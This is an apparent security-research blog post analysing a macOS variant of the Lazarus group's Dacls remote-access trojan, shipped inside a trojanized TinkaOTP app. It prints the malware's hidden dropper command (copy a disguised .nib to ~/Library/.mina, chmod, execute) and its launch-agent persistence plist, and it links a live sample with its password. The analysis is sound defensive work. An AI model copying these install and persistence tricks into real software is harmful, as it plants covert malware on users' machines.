<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x57/plist.png />
<meta name="twitter:title" content=The&#32;Dacls&#32;RAT&#32;...now&#32;on&#32;macOS! />
<meta name="twitter:description" content=deconstructing&#32;the&#32;mac&#32;variant&#32;of&#32;a&#32;lazarus&#32;group&#32;implant. />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=The&#32;Dacls&#32;RAT&#32;...now&#32;on&#32;macOS! />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x57/plist.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">The Dacls RAT ...now on macOS!</div>
  <div class="blogSubTitle">deconstructing the mac variant of a lazarus group implant.</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / May 5, 2020</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; margin-bottom: 15px; font-size: 15px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:
    <br>
    <center>
      <a href="https://macpaw.com/cleanmymac" style="text-decoration: none;">
      <img src="../images/friends/cleanmymac.png" width="100px;" style="display:block;  margin:auto; padding-top: 10px;"/>
      CleanMyMac X
      </a>
    </center>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://malwarebytes.com/?objective-see" style="text-decoration: none;">
      <img src="../images/friends/malwarebytes.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Malwarebytes
      </a>
    </td>
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.airoav.com/" style="text-decoration: none;">
      <img src="../images/friends/airo.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Airo AV
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/Dacls.zip">sample</a> (&lsquo;OSX.Dacls&rsquo;) to our malware collection (password: infect3d)</p>
<p>&hellip;please don‚Äôt infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Early today, the noted Mac Security researcher <a href="https://twitter.com/philofishal">Phil Stokes</a> tweeted about a &ldquo;<i>Suspected #Lazarus backdoor/RAT</i>&rdquo;:</p>
<center>
<blockquote class="twitter-tweet"><p lang="fr" dir="ltr">1. 899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53<br>2. 846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6</p>&mdash; Phil Stokes ‚´çüê†‚´é (@philofishal) <a href="https://twitter.com/philofishal/status/1257678141801332736?ref_src=twsrc%5Etfw">May 5, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>In his tweet he noted various details about the malware and was kind enough to post hashes as well. Mahalo Phil (and <a href="https://twitter.com/thomasareed/">Thomas Reed</a>, who initially noticed the sample on VirusTotal)! üôè</p>
<div class="note">
üìù Update: The sample was originally discovered by <a href="https://twitter.com/hadianjazi" style="text-decoration: none;">Hossein Jazi</a> of <a href="https://www.malwarebytes.com/" style="text-decoration: none;">MalwareBytes</a>.
<br>
<br>
<a href="https://www.malwarebytes.com/" style="text-decoration: none;">MalwareBytes</a> has now published their detailed analysis:
<br>
<br>
<center>
<a href="https://blog.malwarebytes.com/threat-analysis/2020/05/new-mac-variant-of-lazarus-dacls-rat-distributed-via-trojanized-2fa-app/" style="text-decoration: none;">"New Mac variant of Lazarus Dacls RAT distributed via Trojanized 2FA app"</a>
</center>
</div>
<p>As noted in his tweet, current detections for both the <a href="https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/detection">malware&rsquo;s disk image</a> and <a href="https://www.virustotal.com/gui/file/846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6/detection">payload</a> are at 0% (though this is likely to change as AV engines update the signature databases):</p>
<p><img src="../images/blog/blog_0x57/dmgOnVT.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<br>
<br>
<img src="../images/blog/blog_0x57/nibOnVT.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>The Lazarus APT group (North Korea) is arguably to most prevalent (or perhaps just visible) APT group in the macOS space. In fact the majority of my recent macOS malware blogs have been about their creations:</p>
<ul>
<li>
<p>&ldquo;<a href="https://objective-see.com/blog/blog_0x53.html#osx-yort">OSX.Yort</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://objective-see.com/blog/blog_0x49.html">Pass the AppleJeus</a>&rdquo;</p>
</li>
<li>
<p>&ldquo;<a href="https://objective-see.com/blog/blog_0x51.html">Lazarus Group Goes &lsquo;Fileless&rsquo;</a>&rdquo;</p>
</li>
</ul>
<p>Though not remarkably sophisticated, they continue to evolve and improve their tradecraft.</p>
<div class="note">
üìù For more details on the Lazarus APT group, and their recent advancements, see
<br>
<br>
<center>
<a href="https://www.cyberscoop.com/kaspersky-lazarus-group-north-korean-hackers-targeted-financial/" style="text-decoration: none;">"North Korean hackers getting more careful, targeted in financial hacks"</a>
</center>
</div>
<p>In this blog post, we deconstruct the their macOS latest creation (a variant of the <code>Dacls</code> RAT) , highlighting its install logic, persistence mechanism, and capabilities! We&rsquo;ll also highlights IOCs and generic methods of detection.</p>
<h3 id="installation">Installation</h3>
<p>Currently (at least to me), it is unknown how the Lazarus actors remotely infect macOS systems with this specimen (<code>OSX.Dacls</code>). However as our analysis will show, the way the malware is packaged closely mimics Lazarus group&rsquo;s other attacks &hellip;which relied on social engineering efforts. Specifically, coercing macOS users to download and run trojanized applications:</p>
<img src="../images/blog/blog_0x49/rsa.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Thanks to Phil&rsquo;s tweet and hashes, we can find a copy of the attackers&rsquo; Apple Disk Image (<code>TinkaOTP.dmg</code>) on <a href="https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/">VirusTotal</a>.</p>
<p>To extract the embedded files stored on the <code>TinkaOTP.dmg</code> we mount it via the <code>hdiutil</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ hdiutil attach TinkaOTP.dmg 
/dev/disk3            GUID_partition_scheme           
/dev/disk3s1          Apple_HFS                       /Volumes/TinkaOTP
</pre>
</div>
<p>&hellip;which mounts it to <code>/Volumes/TinkaOTP</code>.</p>
<p>Listing the files in the <code>TinkaOTP</code> directory reveals an application (<code>TinkaOTP.app</code>) and an (uninteresting) <code>.DS_Store</code> file:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ls -lart /Volumes/TinkaOTP/

drwxr-xr-x  3 patrick  staff   102 Apr  1 16:11 TinkaOTP.app
-rw-r--r--@ 1 patrick  staff  6148 Apr  1 16:15 .DS_Store
</pre>
</div>
<p>Both appear to have a creation timestamp of April 1st.</p>
<p>The application, <code>TinkaOTP.app</code> is signed &ldquo;adhoc-ly&rdquo; (as the Lazarus group often does):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvvv /Volumes/TinkaOTP/TinkaOTP.app 
Executable=/Volumes/TinkaOTP/TinkaOTP.app/Contents/MacOS/TinkaOTP
Identifier=com.TinkaOTP
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20100 size=5629 flags=0x2(adhoc) hashes=169+5 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha1=8bd4b789e325649bafcc23f70bae0d1b915b67dc
CandidateCDHashFull sha1=8bd4b789e325649bafcc23f70bae0d1b915b67dc
CandidateCDHash sha256=4f3367208a1a6eebc890d020eeffb9ebf43138f2
CandidateCDHashFull sha256=4f3367208a1a6eebc890d020eeffb9ebf43138f298580293df2851eb0c6be1aa
Hash choices=sha1,sha256
CMSDigest=08dd7e9fb1551c8d893fac2193d8c4969a9bc08d4b7b79c4870263abaae8917d
CMSDigestType=2
CDHash=4f3367208a1a6eebc890d020eeffb9ebf43138f2
Signature=adhoc
Info.plist entries=24
TeamIdentifier=not set
Sealed Resources version=2 rules=13 files=15
Internal requirements count=0 size=12
</pre>
</div>
<p>This also means that on modern versions of macOS (unless some exploit is first used to gain code execution on the target system), the application will not (easily) run:</p>
<p><img src="../images/blog/blog_0x57/damaged.png"  width="50%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

¬†</p>
<div class="note">
üìù Jumping a bit ahead of ourselves, a report on the Windows/Linux version of this malware noted that it was uncovered along with a "working payload for Confluence CVE-2019-3396" and that researchers, "speculated that the Lazarus Group used the CVE-2019-3396 N-day vulnerability to spread the Dacls Bot program." 
<p>&hellip;so, it is conceivable that macOS users were targeted by this (or similar) exploits.</p>
<p>Source: <a href="https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/">Dacls, the Dual platform RAT</a>.</p>
</div>
<p><code>TinkaOTP.app</code> is a standard macOS application:</p>
<img src="../images/blog/blog_0x57/appBundle.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Examining its <code>Info.plist</code> file, illustrates that application&rsquo;s binary (as specified in the <code>CFBundleExecutable</code> key), is (unsurprisingly) named <code>TinkaOTP</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ defaults read /Volumes/TinkaOTP/TinkaOTP.app/Contents/Info.plist 
{
    BuildMachineOSBuild = 19E266;
    CFBundleDevelopmentRegion = en;
    CFBundleExecutable = TinkaOTP;
    CFBundleIconFile = AppIcon;
    CFBundleIconName = AppIcon;
    CFBundleIdentifier = "com.TinkaOTP";
    CFBundleInfoDictionaryVersion = "6.0";
    CFBundleName = TinkaOTP;
    CFBundlePackageType = APPL;
    CFBundleShortVersionString = "1.2.1";
    CFBundleSupportedPlatforms =     (
        MacOSX
    );
    CFBundleVersion = 1;
    DTCompiler = "com.apple.compilers.llvm.clang.1_0";
    DTPlatformBuild = 11B52;
    DTPlatformVersion = GM;
    DTSDKBuild = 19B81;
    DTSDKName = "macosx10.15";
    DTXcode = 1120;
    DTXcodeBuild = 11B52;
    LSMinimumSystemVersion = "10.10";
    LSUIElement = 1;
    NSHumanReadableCopyright = "Copyright \\U00a9 2020 TinkaOTP. All rights reserved.";
    NSMainNibFile = MainMenu;
    NSPrincipalClass = NSApplication;
}
</pre>
</div>
<p>As the value for the <code>LSMinimumSystemVersion</code> key is set to <code>&quot;10.10&quot;</code> the malicious application will execute on macOS systems all the way back to <code>OS X Yosemite</code>.</p>
<p>Now, let&rsquo;s take a closer look at the <code>TinkaOTP</code> binary (which will be executed if the user (successfully) launches the application). As expected, it&rsquo;s a 64-bit Mach-O binary:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file TinkaOTP.app/Contents/MacOS/TinkaOTP 
TinkaOTP.app/Contents/MacOS/TinkaOTP: Mach-O 64-bit executable x86_64
</pre>
</div>
<p>Before hopping into a disassembler or debugger, I like to just run the malware is a virtual machine (VM), and observe its actions via process, file, and network. This can often shed valuable insight into the malware actions and capabilities, which in turn can guide further analysis focus.</p>
<div class="note">
üìù I've written several monitor tools to facilitate such analysis:
<br>
<ul style="list-style-type:square;">
  <li>
    <a href="https://objective-see.com/products/utilities.html#ProcessMonitor" style="text-decoration: none;">ProcessMonitor</a>
  </li><br>
  <li>
  <a href="https://objective-see.com/products/utilities.html#FileMonitor" style="text-decoration: none;">FileMonitor</a>
  </li><br>
  <li>
    <a href="https://objective-see.com/products/netiquette.html" style="text-decoration: none;">Netiquette</a>
  </li>
</ul>
</div>
<p>Firing up these analysis tools, and running <code>TinkaOTP.app</code> quickly reveals its installation logic. Specifically the <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">ProcessMonitor</a> records the following:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "signing info (computed)" : {
      "signatureID" : "com.apple.cp",
      "signatureStatus" : 0,
      "signatureSigner" : "Apple",
      "signatureAuthorities" : [
        "Software Signing",
        "Apple Code Signing Certification Authority",
        "Apple Root CA"
      ]
    },
    "uid" : 501,
    "arguments" : [
      "cp",
      "/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib",
      "/Users/user/Library/.mina"
    ],
    "ppid" : 863,
    "ancestors" : [
      863
    ],
    "path" : "/bin/cp",
    "signing info (reported)" : {
      "teamID" : "(null)",
      "csFlags" : 603996161,
      "signingID" : "com.apple.cp",
      "platformBinary" : 1,
      "cdHash" : "D2E8BBC6DB07E2C468674F829A3991D72AA196FD"
    },
    "pid" : 864
  },
  "timestamp" : "2020-05-06 00:16:52 +0000"
}

</pre>
</div>
<p>This output shows <code>bash</code> being spawned by <code>TinkaOTP.app</code> with the following arguments:</p>
<ul>
<li><code>cp</code></li>
<li><code>/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib</code></li>
<li><code>/Users/user/Library/.mina</code></li>
</ul>
<p>&hellip;in other words, the malware is copying the <code>Base.lproj/SubMenu.nib</code> file (from the application&rsquo;s <code>Resources</code> directory) to the user&rsquo;s <code>Library</code> directory (as the &ldquo;hidden&rdquo; file: <code>.mina</code>).</p>
<p>The process monitor then shows <code>TinkaOTP.app</code> setting the executable bit on the <code>.mina</code> file (via <code>chmod +x /Users/user/Library/.mina</code>), before executing it:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "signing info (computed)" : {
      "signatureStatus" : -67062
    },
    "uid" : 501,
    "arguments" : [
      "/Users/user/Library/.mina"
    ],
    "ppid" : 863,
    "ancestors" : [
      863
    ],
    "path" : "/Users/user/Library/.mina",
    "signing info (reported)" : {
      "teamID" : "(null)",
      "csFlags" : 0,
      "signingID" : "(null)",
      "platformBinary" : 0,
      "cdHash" : "0000000000000000000000000000000000000000"
    },
    "pid" : 866
  },
  "timestamp" : "2020-05-06 00:16:53 +0000"
}
</pre>
</div>
<p>A partial sequence of these commands is hardcoded directly in the <code>TinkaOTP.app</code>&rsquo;s binary:</p>
<img src="../images/blog/blog_0x57/command.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Hopping into a disassembler (I use <a href="https://www.hopperapp.com/">Hopper</a>), we can track down code (invoked via the <code>applicationDidFinishLaunching</code> method), responsible for executing said command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Objective-C" data-lang="Objective-C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>;TinkaOTP.AppDelegate.applicationDidFinishLaunching(Foundation.Notification) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>r13 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>direct field offset <span style="color:#66d9ef">for</span> TinkaOTP.AppDelegate.btask : __C.NSTask;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>rdx <span style="color:#f92672">=</span> __C.NSString(<span style="color:#ae81ff">0x7361622f6e69622f</span>, <span style="color:#ae81ff">0xe900000000000068</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>[r15 setLaunchPath:rdx];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>[r15 setArguments:...];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>[<span style="color:#f92672">*</span>(var_30 <span style="color:#f92672">+</span> var_68) launch];</span></span></code></pre></div>
<p>The decompilation is rather ugly (as <code>TinkaOTP.app</code> is written in Swift), but in short the malware is invoking the installation commands (<code>cp ...</code>) via Apple&rsquo;s <a href="https://developer.apple.com/documentation/foundation/nstask"><code>NSTask</code></a> API.</p>
<p>We can confirm this via a debugger (<code>lldb</code>), by setting a breakpoint on the call to <code>[NSTask launch]</code> (at address <code>0x10001e30b</code>) and querying the <code>NSTask</code> object to view its launch path, and arguments:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) b 0x000000010001e30b
Breakpoint 6: where = TinkaOTP`TinkaOTP.AppDelegate.applicationDidFinishLaunching

(lldb) c
Process 899 resuming

Process 899 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1

(lldb) po $rdi
<NSConcreteTask: 0x1003cf370>

(lldb) po [$rdi arguments]
<Swift.__SwiftDeferredNSArray 0x105d0c1a0>(
 -c,
 cp /Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib 
 ~/Library/.mina > /dev/null 2>&1 && chmod +x ~/Library/.mina > /dev/null 2>&1 && 
 ~/Library/.mina > /dev/null 2>&1
)

(lldb) po [$rdi launchPath]
/bin/bash
</pre>
</div>
<h3 id="persistence">Persistence</h3>
<p>We now turn our attention to <code>SubMenu.nib</code>, which was installed as <code>~/Library/.mina</code>.</p>
<p>It&rsquo;s a standard Mach-O executable:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib 
TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib: Mach-O 64-bit executable x86_64
</pre>
</div>
<p>As there turned out to be a bug in the code (ha!), we&rsquo;re going to start our analysis in the disassembler at the malware&rsquo;s <code>main</code> function.
First we noted a (basic) anti-disassembly/obfuscation technique, where strings are dynamically built manually (via hex constants):</p>
<img src="../images/blog/blog_0x57/obfuscated.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>In Hopper, via <code>Shift+R</code> we can covert the hex to ascii:</p>
<img src="../images/blog/blog_0x57/deobfuscated.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;which reveals a path: <code>/Library/LaunchAgents/com.aex.lop.agent.plist</code></p>
<p>However, the malware author(s) also left this string directly embedded in the binary:
<img src="../images/blog/blog_0x57/launchAgent.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>Within the disassembly of the <code>main</code> function, we also find an embedded property list:
<img src="../images/blog/blog_0x57/plist.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>Seems reasonable to assume that the malware will persist itself as a launch agent. And in fact, it tries to!
However, if the <code>~/Library/LaunchAgent</code> directory does not exists (which it does not on default install of macOS), the persistence will fail.</p>
<p>Specifically, the malware invokes the <code>fopen</code> function (with the <code>+w</code> option) on <code>/Library/LaunchAgents/com.aex.lop.agent.plist</code> &hellip;which will error out if any directories in the path don&rsquo;t exist.</p>
<p>This can be confirmed in a debugger:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb ~/Library/.mina

//break at the call to fopen()
(lldb) 0x10000b6e8
(lldb) c

Process 920 stopped
.mina`main:
->  0x10000b6e8 <+376>: callq  0x100078f66               ; symbol stub for: fopen
    0x10000b6ed <+381>: testq  %rax, %rax
    0x10000b6f0 <+384>: je     0x10000b711               ; <+417>
    0x10000b6f2 <+386>: movq   %rax, %rbx
Target 0: (.mina) stopped.


//print arg_0
// this is the path
(lldb) x/s $rdi
0x7ffeefbff870: "/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist"

//step over call
(lldb) ni

//fopen() fails
(lldb) reg read $rax
rax = 0x0000000000000000
</pre>
</div>
<p>&hellip;I guess writing malware can be tough! :P</p>
<p>If we manually create the <code>~/Library/LaunchAgent</code> directory, the call to <code>fopen</code> succeeds and the malware will happily persist. Specifically, it formats the embedded property list (dynamically adding in the path to itself), which is then written out to <code>com.aex-loop.agent.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb ~/Library/.mina

(lldb) 0x100078f72
(lldb) c

Process 930 stopped
.mina`main:
->  0x10000b704 <+404>: callq  0x100078f72               ; symbol stub for: fprintf
    0x10000b709 <+409>: movq   %rbx, %rdi
    0x10000b70c <+412>: callq  0x100078f4e               ; symbol stub for: fclose
    0x10000b711 <+417>: movq   %r12, %rdi
Target 0: (.mina) stopped.


//print arg_1
// this is the format string
(lldb) x/s $rsi
0x10007da69: "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;\r\n&lt;plist version=&quot;1.0&quot;&gt;\r\n&lt;dict&gt;\r\n\t&lt;key&gt;Label&lt;/key&gt;\r\n\t&lt;string&gt;com.aex-loop.agent&lt;/string&gt;\r\n\t&lt;key&gt;ProgramArguments&lt;/key&gt;\r\n\t&lt;array&gt;\r\n\t\t&lt;string&gt;%s&lt;/string&gt;\r\n\t\t&lt;string&gt;daemon&lt;/string&gt;\r\n\t&lt;/array&gt;\r\n\t&lt;key&gt;KeepAlive&lt;/key&gt;\r\n\t&lt;false/&gt;\r\n\t&lt;key&gt;RunAtLoad&lt;/key&gt;\r\n\t&lt;true/&gt;\r\n&lt;/dict&gt;\r\n&lt;/plist&gt;"

//print arg_2
// this is the format data (path to self)
(lldb) x/s $rdx
0x101000000: "/Users/user/Library/.mina"

</pre>
</div>
<p>Our <a href="https://objective-see.com/products/utilities.html#FileMonitor"><code>FileMonitor</code></a> passively observers this:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor/Contents/MacOS/FileMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist",
    "process" : {
      "signing info (computed)" : {
        "signatureStatus" : -67062
      },
      "uid" : 501,
      "arguments" : [

      ],
      "ppid" : 932,
      "ancestors" : [
        932,
        909,
        905,
        904,
        820,
        1
      ],
      "path" : "/Users/user/Library/.mina",
      "signing info (reported)" : {
        "teamID" : "(null)",
        "csFlags" : 0,
        "signingID" : "(null)",
        "platformBinary" : 0,
        "cdHash" : "0000000000000000000000000000000000000000"
      },
      "pid" : 931
    }
  },
  "timestamp" : "2020-05-06 01:14:18 +0000"
}
</pre>
</div>
